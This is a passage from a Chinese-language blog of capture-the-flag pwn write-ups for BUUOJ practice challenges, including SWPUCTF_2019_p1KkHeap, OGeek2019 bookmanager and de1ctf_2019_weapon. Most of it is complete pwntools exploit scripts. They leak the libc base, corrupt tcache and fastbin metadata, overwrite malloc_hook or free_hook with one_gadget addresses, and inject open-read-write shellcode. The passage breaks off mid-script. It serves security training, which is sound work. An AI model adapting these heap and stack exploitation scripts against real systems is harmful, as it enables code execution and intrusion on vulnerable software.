<code>argv[0]</code> 为我们想要输出的字符串的地址，那么在 <strong><code>fortify_fail</code> 函数中就会输出我们想要的信息。</strong></p><p>注意其是%s来打印东西的，所以在利用时要用<code>argv[0]</code>做个跳板。</p><h5 id="如何获取栈值"><a href="#如何获取栈值" class="headerlink" title="如何获取栈值"></a>如何获取栈值</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p><p>Libc上的<code>_environ</code>存放着当前进程的环境变量，其是一个栈地址。</p><p>以此来获取栈值，然后根据偏移来访问栈中的数据。</p><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>获取libc基地址</li><li>获取stack地址，根据偏移找到存放flag的stack address</li><li>覆盖<code>argv[0]</code>为flag的stack address</li></ul><p>其中每次都是用gets 覆盖到覆盖<code>argv[0]</code>  ,stack smashing来完成。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./GUESS'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26813</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(libc.sym[<span class="hljs-string">'_environ'</span>] + libc_base)sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)stack_flag = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x168</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_flag)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(stack_flag)sla(<span class="hljs-string">'flag'</span>,data)itr()</code></pre></div><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>无脑栈溢出</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SUCTF_2018_basic_pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25741</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x118</span> + p64(<span class="hljs-number">0x000000401157</span>)sl(data)itr()</code></pre></div><h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ul><li>开了沙箱，可以orw拿到flag</li><li>功能只能调用18次，free只能3次</li><li>free中存在uaf</li><li>mmap了一块 rwx的内存在 <code>0x66660000</code></li></ul><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>泄漏heap base，准备攻击tcache bin的表头</li><li>覆盖bin counts为7，伪造满bin，free chunk，泄漏libc</li><li>攻击tcache bin的表头中bin chunk header 的部分，放下<code>0x66660000</code> 和<code>malloc_hook</code>，准备修改这两个部分。</li><li>在<code>0x66660000</code>的内存上写下orw的shellcode</li><li>攻击<code>malloc_hook</code>为<code>0x66660000</code> 取得flag</li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SWPUCTF_2019_p1KkHeap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29911</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">'''================================================================================ line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heap_base'</span>,heap_base)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>debug()data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span>edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span>free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0xc0</span> - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x3ebc30</span> + libc_base) +p64(<span class="hljs-number">0x66660000</span>) edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>orw = shellcraft.open(<span class="hljs-string">'flag'</span>)orw += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)orw +=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)edit(<span class="hljs-number">5</span>,asm(orw))add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">1</span>)itr()</code></pre></div><h3 id="题记-1"><a href="#题记-1" class="headerlink" title="题记"></a>题记</h3><p>在学习别人的exp时，发现还有泄漏libc的另外一种办法，这种办法泄漏出libc，也使得整个exp，基本跟我的不大相同。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p><strong>在tcache bin的表头中，其每个大小tcache bin的count(0-7) 是一个无符号类型的数据。</strong></p><p>当用uaf漏洞，在一个chain上伪造一个chunk地址，这样当申请后tcache bin的count会变成0xff&gt;0x7，这样利用uaf，再次释放这个chain上 的chunk，就会进入到unsortbin，接着就leak 出libc了。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk<span class="hljs-number">0x55daa2e85000</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x250</span>                Used                None              None<span class="hljs-number">0x55daa2e85250</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x7fb70dbbaca0</span>    <span class="hljs-number">0x7fb70dbbaca0</span><span class="hljs-number">0x55daa2e85360</span>      <span class="hljs-number">0x110</span>               <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x55daa2e85370</span>              Nonepwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x55daa2e85000</span><span class="hljs-number">0x55daa2e85000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000251</span><span class="hljs-number">0x55daa2e85010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0xff00000000000000</span><span class="hljs-number">0x55daa2e85020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>剩下的就是进行tcache dup即可。这个比我那个方法要简单的多。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p><h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a><code>护网杯_2018_gettingstart</code></h2><p>白给题。考浮点数在内存中是怎么存的。</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-string">'1'</span> * <span class="hljs-number">24</span> + p64(<span class="hljs-number">0x7fffffffffffffff</span>) + p64(<span class="hljs-number">0x3FB999999999999A</span>)s(data)itr()</code></pre></div><h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><ul><li>存在heap overflow</li><li>uaf</li><li>off by one</li></ul><p>一堆洞，伪代码看起来很复杂，但是利用起来较为简单。</p><p>重点漏洞函数在 updata上。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn-2'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29005</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_section</span><span class="hljs-params">(chapter,name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sa(<span class="hljs-string">'into'</span>,str(chapter))    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_text</span><span class="hljs-params">(section,size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sa(<span class="hljs-string">'into'</span>,str(section))    sla(<span class="hljs-string">'write'</span>,str(size))    sa(<span class="hljs-string">'Text'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_section</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'5'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_text</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'7'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(type,name,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'8'</span>)    sla(<span class="hljs-string">'update'</span>,str(type))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'New'</span>,str(data))sla(<span class="hljs-string">'Name'</span>,<span class="hljs-string">'chumen77'</span> * <span class="hljs-number">4</span>)add_chapter(<span class="hljs-string">'chumen77'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'2'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'3'</span>)add_text(<span class="hljs-string">'1'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)<span class="hljs-comment"># show()</span>add_text(<span class="hljs-string">'2'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'2'</span>*<span class="hljs-number">0x100</span>)del_section(<span class="hljs-string">'1'</span>)del_section(<span class="hljs-string">'2'</span>)show()ru(<span class="hljs-string">'Section:'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_baseadd_text(<span class="hljs-string">'3'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)edit(<span class="hljs-string">'Section'</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'3'</span> + <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'1'</span>*(<span class="hljs-number">0x20</span><span class="hljs-number">-2</span>) + <span class="hljs-string">'\xd0'</span>)data = p64(free_hook) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,data)one = libc_base + rce16[<span class="hljs-number">2</span>]edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,p64(one))del_chapter(<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="题记-2"><a href="#题记-2" class="headerlink" title="题记"></a>题记</h3><ul><li><p>题是简单题，但是由于代码一多，且指针看起来复杂，个人做起来就有点慢，并且让自己连最简单的heap overflow都没有想起来去利用。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4></li><li><p>对于指针复杂的堆信息分配，可以直接gdb上手调来确定基本堆信息。</p></li></ul><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><ul><li>uaf</li><li>最大只能申请0x60的chunk</li><li>没有show函数</li><li>部分input利用scanf来获取读入</li></ul><h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>free 2个chunk，然后用scanf 读入大量的字符，来获取一个smallbin</li><li>利用残留的libc地址，fastbin attck <code>IO_stdout</code>来泄漏libc</li><li>fastbin attck <code>malloc_hook</code></li></ul><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./de1ctf_2019_weapon'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size of weapon:'</span>,str(size))    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'new'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x1000</span>)    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p16(<span class="hljs-number">0xa5dd</span>))    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">2</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>)    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    <span class="hljs-comment"># debug()</span>    data = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span 